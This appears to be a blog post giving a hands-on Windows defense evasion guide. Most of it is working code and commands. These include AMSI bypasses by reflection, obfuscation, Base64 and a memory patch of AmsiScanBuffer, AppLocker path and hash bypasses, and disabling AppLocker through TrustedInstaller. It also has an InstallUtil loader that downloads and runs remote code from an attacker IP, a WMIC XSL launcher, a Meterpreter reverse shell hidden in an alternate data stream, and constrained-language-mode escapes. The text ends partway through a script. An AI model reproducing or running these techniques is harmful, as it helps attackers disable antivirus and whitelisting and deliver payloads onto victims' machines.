---
title: "Windows Defense Evasion Guide"
date: 2025-12-01
categories: 
    - Network
tags: 
    - Evasion
    - Windows
description: "In this blog post, I explored various Windows defensive mechanisms, configured them, and then demonstrated techniques to bypass them."
cover: /images/site/posts/DefenseEvasion/Evasion.jpg
---

## Antimalware Scan Interface [ AMSI ]

Antimalware Scan Interface [ AMSI ] is. Microsoft developed it to provide a set of API calls for applications, including any third-party applications, to perform a <span style="color:yellow">signature-based scan of the content</span>.

Windows Defender uses it to scan PowerShell scripts, .NET, VBA macros, Windows Script Host (WSH), VBScript, and JavaScript to detect common malware. The important thing about AMSI is that you do not need to deploy it; it has been there since Windows 10.

So how does AMSI work :

* When AMSI is invoked, <span style="color:yellow">AMSI.dll</span> is loaded into the application’s memory.
* The key functions within AMSI.dll include `AmsiScanBuffer` and `AmsiInitialize`.
* If the content is clear it will return 1 means the script will be executed

Let's see :

<figure><img src="/images/site/posts/DefenseEvasion/def.png" alt=""></figure>


let's see what Windows version is Copy
that is running and what antivirus software that is installed


```powershell
PS C:\Users\matio> Get-WmiObject Win32_OperatingSystem | Select PSComputerName, Caption, Version | fl

PSComputerName : ATTACKER
Caption        : Microsoft Windows 10 Pro
Version        : 10.0.19045

PS C:\Users\matio> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

displayName              : Bitdefender Antivirus
instanceGuid             : {0F59B032-EA77-E3A8-2382-74A4346E5522}
pathToSignedProductExe   : C:\Program Files\Bitdefender\Bitdefender Security\wscfix.exe
pathToSignedReportingExe : C:\Program Files\Bitdefender\Bitdefender Security\wsccommunicator.exe
productState             : 266240
PSComputerName           :

displayName              : Windows Defender
instanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
pathToSignedProductExe   : windowsdefender://
pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
productState             : 393472
PSComputerName           :
```

Let's test AMSI

```powershell
PS C:\Users\matio> Invoke-Mimikatz
At line:1 char:1
+ Invoke-Mimikatz
+ ~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\Users\matio> "Invoke"+"Mimikatz"
InvokeMimikatz
```

Okay AMSI works well let's try to see several ways to bypass it [ I will explain it in depth so bring ur coffee ]

### Error Forcing

Error forcing to bypass AMSI (Antimalware Scan Interface) is a technique used by attackers to <span style="color:yellow">manipulate errors in a way that causes AMSI to fail, effectively bypassing its scanning functionality</span> , The idea is to exploit weaknesses or specific conditions that prevent AMSI from successfully scanning the content, thereby allowing potentially malicious scripts to execute without being detected.

Let's see an example , and break it into lines



```powershell
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f 
$c),'NonPublic,Static')
$field.SetValue($null,$true)
```

* $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'


```powershell
$w = 'System.Management.Automation.A'
$c = 'si'
$m = 'Utils'
```

We have 3 variables here $w , $c , $m if u combine them u will get `System.Management.Automation.AmsiUtils` but what is it ?

`System.Management.Automation.AmsiUtils` is a class within the .NET framework that is part of the `System.Management.Automation` namespace.

The primary purpose of `System.Management.Automation.AmsiUtils` is to provide utilities for interacting with AMSI. <span style="color:yellow">It allows PowerShell scripts to be scanned for malicious content by the antivirus software before execution, helping to prevent the execution of malicious scripts</span>.

* $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))

Let's see it in a good way without variables


```powershell
$assembly = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))
```

So what does that mean ?

In the context of AMSI bypass techniques, obtaining the type information for `System.Management.Automation.AmsiUtils` is crucial because it allows you to interact with the internal fields and methods of this class, which are not accessible through regular PowerShell commands. By using <span style="color:yellow">reflection</span>, you can access and manipulate private and internal members of the class, such as the `amsiInitFailed` field.

But what is reflection ?

Reflection is a feature in many programming languages, including .NET and Java, that allows a program to inspect and interact with its own structure and behavior at runtime. This includes inspecting types, methods, properties, fields, and other metadata, as well as creating and manipulating objects dynamically. Reflection is particularly powerful because it <span style="color:yellow">allows for more dynamic and flexible code, though it can also introduce complexity and performance overhead</span>.

Let's see an important screenshot

<figure><img src="/images/site/posts/DefenseEvasion/def1.png" alt=""></figure>


When you see this output, it means that :

1. The type `AmsiUtils` is successfully retrieved from the assembly, indicating that AMSI is present and recognized.
2. Since `AmsiUtils` is not public, it suggests that the class is intended for internal use within the .NET assembly.
3. The type inherits from `System.Object`, which is typical for most classes in .NET

* $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')

Let's see it in a good way without variables


```powershell
$field = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed', 'NonPublic,Static')
```

This line retrieves the field `amsiInitFailed` from the `AmsiUtils` type. The `NonPublic` and `Static` flags indicate that it is a non-public (private or protected) static field.

<figure><img src="/images/site/posts/DefenseEvasion/def2.png" alt=""></figure>


* $field.SetValue($null,$true)

Let's see it in a good way without variables


```powershell
[Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)
```

By setting the value of the `amsiInitFailed` field to `true`, the script tricks PowerShell into believing that <span style="color:yellow">AMSI failed to initialize properly</span>. As a result, PowerShell skips or disables AMSI's scanning functionality.

Nice now we break it let's see bypass the AMSI

<figure><img src="/images/site/posts/DefenseEvasion/def3.png" alt=""></figure>


We filed! , That's okay

[This command is very popular in AMSI bypass](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) so it's regular to be detected

<figure><img src="/images/site/posts/DefenseEvasion/def4.png" alt=""></figure>

### Obfuscation

Obfuscation in AMSI bypass refers to techniques used to <span style="color:yellow">conceal or disguise the code that performs the AMSI bypass</span>. The purpose is to make the bypass harder to detect by security software and reverse engineers, I will show u some ways that u can use Obfuscation to bypass

#### String Splitting and Concatenation

We tested it before in our last example but let us make it work

<figure><img src="/images/site/posts/DefenseEvasion/def5.png" alt=""></figure>


Let's use [AMSITrigger](https://github.com/RythmStick/AMSITrigger) to see why we are blocked from [Bitdefender](https://www.bitdefender.com/)

Make an exception for ur dir to test the scripts


<figure><img src="/images/site/posts/DefenseEvasion/def6.png" alt=""></figure>

Okay now we know where is the AMSI detect us let's see how we can bypass it , We see it from the last example so i don't need to explain what i do again

from

```powershell
$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils');
$Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);
```

To

```powershell
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f 
$c),'NonPublic,Static')
$field.SetValue($null,$true)
```

Let's see if this work

<figure><img src="/images/site/posts/DefenseEvasion/def7.png" alt=""></figure>

The AMSI told us it's clean but we are still on the radar , It doesn't work again !!

So i try to use more variables and concatinate them

```powershell
$namespace = 'System.Management.Automation'
$classPrefix = 'A'
$propertyName = 'InitFailed'
$visibility = 'NonPublic,Static'
$w = "$namespace.$classPrefix" # System.Management.Automation.A 
$c = 'si'
$m = 'Utils'
$fullClassName = '{0}m{1}{2}' -f $w, $c, $m #System.Management.Automation.AmsiUtils
$assembly = [Ref].Assembly.GetType($fullClassName)
$propertyFullName = 'am{0}{1}' -f $c, $propertyName
$field = $assembly.GetField($propertyFullName, $visibility)
$field.SetValue($null, $true)
```

Let's try to check this out with [gocheck](https://github.com/gatariee/gocheck) and see if it works



<figure><img src="/images/site/posts/DefenseEvasion/def8.png" alt=""></figure>

It doesn't work again, Am...

At this time I refused to move forward and try to learn other methods and combine them to bypass so I scratched my head and got a good idea

We can use <span style="color:yellow">environment variables</span> to evade detection by the antivirus , Let's craft our script

So I decided to write a PowerShell script That retrieves all environment variables to search for every word that I entered to get it immediately as a variable you can use it from my GitHub repo from [here](https://github.com/N1NJ10/Bad_Scripts/blob/main/PowerShell/Envrandomizer.ps1)

> The idea behinde this sript come to me after seeing [Daniel Bohannon](https://www.youtube.com/watch?v=-j7zzUwB_-E&t=414s) explaining Invoke-CradleCrafter

With this script, i can craft our payload in a new way

```
# Extract characters from system environment variables to form "system"
$s1 = [Environment]::GetEnvironmentVariable('DriverData')[11]  # 'S'
$s2 = [Environment]::GetEnvironmentVariable("COMSPEC")[12]  # 'y'
$s3 = [Environment]::GetEnvironmentVariable("ComSpec")[9] # 's'
$s4 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12] # 't'
$s5 = [Environment]::GetEnvironmentVariable("HOMEPATH")[3]  # 'e'
$s6 = [Environment]::GetEnvironmentVariable("ALLUSERSPROFILE")[9]  # 'm'

$s = "$s1$s2$s3$s4$s5$s6" # "System"

# Extract characters from system environment variables to form "Management"
$m1 = [Environment]::GetEnvironmentVariable("PSModulePath")[137]  # 'M'
$m2 = [Environment]::GetEnvironmentVariable("ALLUSERSPROFILE")[8]  # 'a'
$m3 = [Environment]::GetEnvironmentVariable("CommonProgramFiles")[22]  # 'n'
$m4 = [Environment]::GetEnvironmentVariable("ALLUSERSPROFILE")[8]  # 'a'
$m5 = [Environment]::GetEnvironmentVariable("ProgramFiles(x86)")[6]  # 'g'
$m6 = [Environment]::GetEnvironmentVariable("HOMEPATH")[3]  # 'e'
$m7 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[9]  # 'M'
$m8 = [Environment]::GetEnvironmentVariable("HOMEPATH")[3]  # 'e'
$m9 = [Environment]::GetEnvironmentVariable("CommonProgramFiles")[22] # 'n'
$mx = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12] # 't'

$m = "$m1$m2$m3$m4$m5$m6$m7$m8$m9$mx" # "Management"

# Extract characters from system environment variables to form "Automation"
$a1 = [Environment]::GetEnvironmentVariable('APPDATA')[15]  # 'A'
$a2 = [Environment]::GetEnvironmentVariable('FPS_BROWSER_USER_PROFILE_STRING')[4]  # 'u'
$a3 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'
$a4 = [Environment]::GetEnvironmentVariable("windir")[7]  # 'o'
$a5 = [Environment]::GetEnvironmentVariable("ALLUSERSPROFILE")[9]  # 'm'
$a6 = [Environment]::GetEnvironmentVariable("ALLUSERSPROFILE")[8]  # 'a'
$a7 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'
$a8 = [Environment]::GetEnvironmentVariable("CommonProgramFiles")[12]  # 'i'
$a9 = [Environment]::GetEnvironmentVariable("windir")[7]  # 'o'
$ax = [Environment]::GetEnvironmentVariable("CommonProgramFiles")[22]  # 'n'
$a = "$a1$a2$a3$a4$a5$a6$a7$a8$a9$ax"  # "Automation"

# Extract characters from system environment variables to form "Amsi"
$am0 =  [Environment]::GetEnvironmentVariable("TEMP")[4] + [Environment]::GetEnvironmentVariable("PUBLIC")[13] # 'si'
$am1 = [Environment]::GetEnvironmentVariable('APPDATA')[15]  # 'A'
$am2 = [Environment]::GetEnvironmentVariable("TEMP")[9]  # 'm'
$am3 = [Environment]::GetEnvironmentVariable("TEMP")[4]  # 's'
$am4  = [Environment]::GetEnvironmentVariable("PUBLIC")[13]  # 'i'
$am = "$am1$am2$am3$am4"  # "Amsi"

# Extract characters from system environment variables to form "Utils"
$u1 = [Environment]::GetEnvironmentVariable("PSModulePath")[3]  # 'U'
$u2 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'
$u3 = [Environment]::GetEnvironmentVariable("PUBLIC")[13]  # 'i'
$u4 = [Environment]::GetEnvironmentVariable("PSModulePath")[40]  # 'l'
$u5 = [Environment]::GetEnvironmentVariable("PSModulePath")[49]  # 's'
$u = "$u1$u2$u3$u4$u5"  # "Utils"

# Construct the type name for AMSI Utils
$typeName = "$s.$m.$a.$am$u"  # "System.Management.Automation.AmsiUtils"

# Get the AMSI Utils type
$assembly = [Ref].Assembly.GetType($typeName)

# Get the 'amsiInitFailed' field

$field = $assembly.GetField(('am{0}InitFailed' -f $am0), 'NonPublic,Static')

# Set the 'amsiInitFailed' field to true
$field.SetValue($null, $true)
```

That's nice let's try it

<figure><img src="/images/site/posts/DefenseEvasion/def9.png" alt=""></figure>

> **Remove the comments** to avoid detecting i just put them for u to understand what I do
{: .prompt-tip }

Bypassed ! , Yeah we did it together mate be creative in ur thoughts and u will see magic , Let's see other methods

> Bypassing AMSI does not necessarily bypass all antivirus protections. Modern antivirus solutions employ multiple layers of defense, including behavioral analysis and heuristics, which can still detect and block malicious activities even if AMSI is bypassed.
{: .prompt-info }

#### Base64 Encoding

Of course, encoding will get into the game, Let's see how to use it

```powershell
$command = 'hostname'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
Write-Output $encodedCommand

$decodedBytes = [Convert]::FromBase64String($encodedCommand)
$decodedCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
Invoke-Expression $decodedCommand
```

This example takes a command [ hostname ] and encodes it to base64 then decodes and execute it this is the same method that we will be using

> [Why do we use bytes no encode and decode directly ?](https://stackoverflow.com/questions/3538021/why-do-we-use-base64)
>
> This is necessary because Base64 operates on byte data. Strings are sequences of characters, which must be converted to bytes for Base64 encoding.
{: .prompt-info }

<figure><img src="/images/site/posts/DefenseEvasion/def10.png" alt=""></figure>


Let's see how to use it in our script

from

```powershell
$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils');
$Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);
```

[To](https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

Let's see if this work

<figure><img src="/images/site/posts/DefenseEvasion/def11.png" alt=""></figure>

Again we bypassed the AMSI with the Base64-encoded payload

There is many obfuscation methods left , I will leave u some resources at the end of the post to check them out and try to make one of them work with u consider it as a task

### Memory Patch

The idea behind this bypass is to force <span style="color:yellow">AmsiScanBuffer to return AMSI\_RESULT\_CLEAN</span>. The general idea is to import API calls and then return a specific value to the AmsiScanBuffer() call: 0x80070057. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double add operand and successfully bypass the control. The code for this is as follows:


```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
```

Let's try it


<figure><img src="/images/site/posts/DefenseEvasion/def12.png" alt=""></figure>

Again we bypassed the AMSI

>If u wanna deep dive into this u can write this [writeup](https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)
{: .prompt-tip }

## AppLocker and Powershell CLM

Applocker is a white-listing solution With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: **by Name, Path, Publisher, or Hash** , you can use rules to enforce it to Allow and deny as I will show you

PowerShell Constrained Language Mode [ CLM ] is a [language mode](https://devblogs.microsoft.com/powershell/a-comparison-of-shell-and-scripting-language-security/) of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs , So why this for ?

Because it's an incredibly effective way to drastically reduce the risk of viruses, ransomware, and unapproved software. For DeviceGuard UMCI the approved applications are determined via a UMCI policy. PowerShell automatically detects when a UMCI policy is being enforced on a system and will run only in Constrained Language mode. So PowerShell Constrained Language mode becomes more interesting when working in conjunction with system-wide lockdown policies.

>Local Account Syntax: The general syntax for logging in with a local account is `.\username`
{: .prompt-tip }

Now we know what is Applocker & PowerShell Constrained Language Mode let's see how to use them, I need you to follow this [guide](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)

Let's setup our enviroment :

First we need to configure the Applocker policy from LocalGroupPolicy -> Computer Configration -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker

Then i need you to follow the pervious blog and create 2 rules :

* Rule Path to run only executables from the C:\Windows\*
* block the [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) by the hash

Then generate the default creds for the Script Rules to apply the Constrained Language Mode

<figure><img src="/images/site/posts/DefenseEvasion/def13.png" alt=""></figure>


If you follow the rules you should see something like this !


<figure><img src="/images/site/posts/DefenseEvasion/def15.png" alt=""></figure>

> This is from [Rudy Ooms](https://patchmypc.com/blog/windows-11-24h2-applocker-powershell-constrained-language-broken/) :
>
>But How PowerShell Determines Language Mode Based on AppLocker Script Rules ??
>
>When PowerShell starts, it checks whether [AppLocker Script Enforcement](https://call4cloud.nl/deploying-applocker-intune-powershell/) Rules are present. It does this by simulating the execution of a test PowerShell script placed in the user’s temporary folder and evaluating it against the system’s policies. As shown below, the DLL (System.Management.Automation.dll) responsible for PowerShell shows this behavior.
><figure><img src="/images/site/posts/DefenseEvasion/def16.png" alt=""></figure>
>This means that if AppLocker’s rules block or restrict the test PS1 file, PowerShell automatically switches into Constrained Language Mode.
><figure><img src="/images/site/posts/DefenseEvasion/def17.png" alt=""></figure>
>If no restrictions apply, PowerShell Scripts will be executed in full language mode. This automatic detection has worked reliably for years and has been a simple way to enforce script safety without needing extra configuration inside PowerShell itself.
{: .prompt-tip }

But is this a good security approach , It depends on the quality of the rules we are implementing

Can you disable the Applocker ? ( **Matio here is an administrator** )

For the first look you can say yes if we are an administrators but seems it doesn't work like this

Let's first talk about the PPL (Protected Process Light) : The PLL is a security feature in Windows that protects critical system processes like antivirus engines, security services, and system integrity components from being **tampered with**, even by **administrators or SYSTEM-level accounts**.

So Let's try to disable the AppLocker

<figure><img src="/images/site/posts/DefenseEvasion/def18.png" alt=""></figure>

Even with the System account

<figure><img src="/images/site/posts/DefenseEvasion/def19.png" alt=""></figure>

>By the way  [tiraniddo](https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html) here found a way to disable the AppLocker with the TrustedInstaller account :
>```powershell
$a = New-ScheduledTaskAction -Execute cmd.exe -Argument "/C sc.exe config appidsvc start= demand && sc.exe stop appidsvc"
Register-ScheduledTask -TaskName 'TestTask' -TaskPath \ -Action $a
$svc = New-Object -ComObject 'Schedule.Service'
$svc.Connect()
$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('TestTask')
$task.RunEx($null, 0, 0, $user)
```
{: .prompt-tip }

### Path / Hash restrictions bypass

In this scenario, i will show you how we can bypass the Path / Hash restrictions by moving the file to an allowed executable path and changing the file wish to lead to changing the whole hash

First we will see what directories that our permession to the subdirectories of the main dir that we can run exe files from it

Then we will edit the file hash , Seems this will make will work

```powershell
PS C:\Users\matio> Get-ChildItem C:\Windows\ -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $dir = $_; try { (Get-Acl $dir.FullName -ErrorAction SilentlyContinue).Access | Where-Object { $_.AccessControlType -eq "Allow" -and ($_.IdentityReference.Value -eq "NT AUTHORITY\Authenticated Users" -or $_.IdentityReference.Value -eq "BUILTIN\Users") -and (($_.FileSystemRights -like "*Write*" -or $_.FileSystemRights -like "*Create*") -and $_.FileSystemRights -like "*Execute*") } | ForEach-Object { Write-Host ($dir.FullName + ": " + $_.IdentityReference.Value + " (" + $_.FileSystemRights + ")") } } catch {} }
C:\Windows\Tasks: NT AUTHORITY\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)
C:\Windows\tracing: BUILTIN\Users (Write, ReadAndExecute, Synchronize)
C:\Windows\System32\spool\drivers\color: BUILTIN\Users (CreateFiles, ReadAndExecute, Synchronize)
PS C:\Users\matio> cp .\Downloads\nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe
PS C:\Users\matio> & C:\Windows\System32\spool\drivers\color\nc64.exe
Program 'nc64.exe' failed to run: This program is blocked by group policy. For more information, contact your system
administratorAt line:1 char:1
+ & C:\Windows\System32\spool\drivers\color\nc64.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ & C:\Windows\System32\spool\drivers\color\nc64.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

PS C:\Users\matio> echo "N1NJ10" >> C:\Windows\System32\spool\drivers\color\nc64.exe
PS C:\Users\matio> & C:\Windows\System32\spool\drivers\color\nc64.exe -l -p 7777
```

<figure><img src="/images/site/posts/DefenseEvasion/def20.png" alt=""></figure>


### InstallUtil - Shell ( Updated Part )

There is a bypass technique that usess the [Installutil](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool) , My first time to see it from [pentestlab](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/) i reccomed u to read this before contiue

As we know now , when can use installutil to run an exe files inside them to bypass the applocker rules ( Since this utility is a <span style="color:yellow">Microsoft signed binary</span> then it could be used to run any .NET executables bypassing in that way AppLocker restrictions. Also this utility is <span style="color:yellow">located inside the Windows directory</span> which AppLocker policies are not going to be applied as the contents of the Windows folder are needed to be executed in order for the system to run normally ) and bypass the CLM lang ( InstallUtil <span style="color:yellow">executes the code in a .NET context, not PowerShell, avoiding CLM restrictions</span>. ) , okey let's see how we can exploit this using this code


```powershell
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace BypassCLM
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is vairous , ru kidding !!!! ");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
           string amsiBypass = @"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
           string cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.99.21:8080/a9kMET')";

           Runspace rs = RunspaceFactory.CreateRunspace();
           rs.Open();
           PowerShell ps = PowerShell.Create();
           ps.Runspace = rs;
           ps.AddScript(amsiBypass); // First, bypass AMSI
           ps.Invoke();
           ps.AddScript(cmd); // Then, execute the downloaded script
           ps.Invoke();
           rs.Close();
        }
    }
}
```

Create ur reverse shell and change the cmd variable ( u can do it with metasploit or any other c2 ) and the amsiBypass also , Then compile it with the .Net [csc.exe](https://dotnet.microsoft.com/en-us/download/dotnet-framework) binary


```powershell
& C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:Bypass.exe BypassCLM.cs
certutil -encode Bypass.exe bypass.txt
```

Then run your [RangeHTTPServer](https://github.com/danvk/RangeHTTPServer) ( **Not http** )


```bash
python3 -m RangeHTTPServer 1234
```

Then go to your victum and excute those commands

```powershell
bitsadmin /transfer Bad_Work http://192.168.99.21/bypass.txt C:\Windows\System32\spool\drivers\color\bypass.txt
certutil -decode C:\Windows\System32\spool\drivers\color\bypass.txt C:\Windows\System32\spool\drivers\color\bypass.exe
& C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\System32\spool\drivers\color\bypass.exe
```

If you follow those steps you should get the shell

<figure><img src="/images/site/posts/DefenseEvasion/def21.png" alt=""></figure>


### WMIC ( Updated Part )

There is a small trick when u can use a wmic to bypass this restrictions , I try this one on a ctf on hackthebox you can use this xsl file ( Change the reverse shell ) :

```powershell
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
        <ms:script implements-prefix="user" language="JScript">
                <![CDATA[
                        var r = new ActiveXObject("WScript.Shell");
                        r.Run("powershell.exe -nop -w hidden -e xxxxxxxxxxxxxxxxxx=");
                ]]>
        </ms:script>
</stylesheet>
```

Then you can get the file from the server or download and excute it


```powershell
wmic process get brief /format:"rev.xsl"
wmic process get brief /format:"http://192.168.99.21:1234/rev.xsl"
```

>There is more ways you can test from here :
>* [snovvcra.sh](https://ppn.snovvcra.sh/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass)
>* [itm4n](https://itm4n.github.io/reinventing-powershell/#constrained-language-mode-clm)
>* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
{: .prompt-tip }


### Alternate Data Stream

[OWASP](https://owasp.org/www-community/attacks/Windows_alternate_data_stream) said The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called `:$DATA`

So we can hide a data stream in any file without the user even konw !!

So let's first create our reverse shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.21 LPORT=7771 -a x64 --platform Windows -f exe -o rev_shell.exe
```

Then transfer the file to the victum machine and embaded it into another file ( **Run this from the cmd** )

```powershell
type C:\Users\matio\Desktop\rev_shell.exe > "C:\Users\matio\Desktop\test.txt -Stream rev_shell.exe"

wmic process call create '"test.txt:rev_shell.exe"'
```

Then it should be worked.

## Powershell CLM Bypass

Let's see if we can bypass the CLM , First let's see the LanguageMode we are using

```powershell
$ExecutionContext.SessionState.LanguageMode
```

<figure><img src="/images/site/posts/DefenseEvasion/def22.png" alt=""></figure>

There is more than a way to Bypass the CLM

### PowerShdll

we can Run PowerShell with rundll32. Bypass software restrictions using [PowerShdll](https://github.com/p3nt4/PowerShdll), so Let's see

```powershell
bitsadmin /transfer Bad_Work http://192.168.99.21:1234/PowerShdll_x64.dll C:\Windows\System32\spool\drivers\color\PowerShdll_x64.dl
rundll32.exe PowerShdll_x64.dll,main -w
```

<figure><img src="/images/site/posts/DefenseEvasion/def23.png" alt=""></figure>

>You can try some other tools like [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM) or [bypass-clm](https://github.com/calebstewart/bypass-clm)
{: .prompt-tip }

### %TEMP%ORARY ( Updated Part )

One of the catchy methods to bypass the CLM language in powershell is this method

Remmeber in the beggening of talking about the CLM i leave you with an important note by Rudy Ooms [ When PowerShell starts, it checks whether [**AppLocker Script Enforcement**](https://call4cloud.nl/deploying-applocker-intune-powershell/) Rules are present. It does this by simulating the execution of a test **PowerShell script placed in the user’s temporary** folder and evaluating it against the system’s policies. ] so why this important ?

By focus on this statment we should understand that , when a user open the powershell for the first time the system made a random powershell script in his temp dir ( Which are not in the dirs that can execute any binaries or powershell scripts ) and see if this user can execute this script or not

If yes okey make him in the FullLanguage mode if not change the language mode to ConstrainedLanguage , Okey what if we change the user temp dir in the enviroment to path that we have access and this path in the dirs that applocker permit them to run the executables and scripts from ( Like we do in the applocker bypass ) and start a new powershell session with those new env variables ?

This was [Oddvar](http://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/) idea so he make this script , let's test it and see if this sucess or not

```powershell
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "powershell"
sleep 5

#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp

OR the Cool one by Matt Graeber Note -> https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc

#Path to Powershell
$CMDLine = "$PSHOME\powershell.exe"

#Getting existing env vars
[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }

#Custom TEMP and TMP
